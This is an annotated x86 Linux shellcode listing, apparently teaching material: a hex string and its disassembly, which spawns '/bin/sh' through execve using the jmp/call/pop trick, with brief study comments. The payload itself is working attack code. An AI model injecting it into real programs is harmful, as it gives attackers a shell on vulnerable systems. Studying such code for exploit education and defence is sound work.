; Hex: eb1f5e89760831c088460789460cb00b89f38d4e088b560ccd8031db89d840cd80e8dcffffff2f62696e2f7368

0:  eb 1f                   jmp    0x21 ; Relative!
2:  5e                      pop    esi
3:  89 76 08                mov    DWORD PTR [esi+0x8],esi
6:  31 c0                   xor    eax,eax
8:  88 46 07                mov    BYTE PTR [esi+0x7],al
b:  89 46 0c                mov    DWORD PTR [esi+0xc],eax
e:  b0 0b                   mov    al,0xb  
10: 89 f3                   mov    ebx,esi
12: 8d 4e 08                lea    ecx,[esi+0x8]
15: 8b 56 0c                mov    edx,DWORD PTR [esi+0xc]
18: cd 80                   int    0x80
1a: 31 db                   xor    ebx,ebx
1c: 89 d8                   mov    eax,ebx
1e: 40                      inc    eax
1f: cd 80                   int    0x80
21: e8 dc ff ff ff          call   0x2 ; What does it mean? Read the assembly code
; Data - no assembly code is written in here.